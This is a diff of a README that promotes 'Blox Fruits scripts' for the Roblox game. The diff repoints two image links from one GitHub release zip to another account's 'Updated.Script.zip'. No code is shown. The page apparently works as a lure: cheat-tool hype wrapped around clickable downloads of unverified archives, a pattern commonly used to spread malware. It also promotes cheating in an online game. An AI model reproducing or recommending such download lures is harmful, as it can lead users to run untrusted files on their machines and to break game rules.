@@ -3,10 +3,10 @@
 **Blox Fruits**, one of the most popular and engaging games on **Roblox**, offers players the opportunity to embark on an epic pirate journey filled with powerful Devil Fruits, massive boss fights, and exhilarating adventures. However, like many online games, progressing in **Blox Fruits** can take hours of grinding and effort. This is where **Blox Fruits scripts** come into play, providing powerful tools that can automate tasks and help you level up faster.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![be2727eb-5ae9-45d3-93cf-3c14393e4ada](https://github.com/user-attachments/assets/6a671348-0bac-4085-8a6f-70ea3ce48872)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 
 In this comprehensive guide, we will explore everything you need to know about **Blox Fruits scripts**—from what they are and how they work, to how they can enhance your **Blox Fruits** experience and help you achieve success faster in 2025.
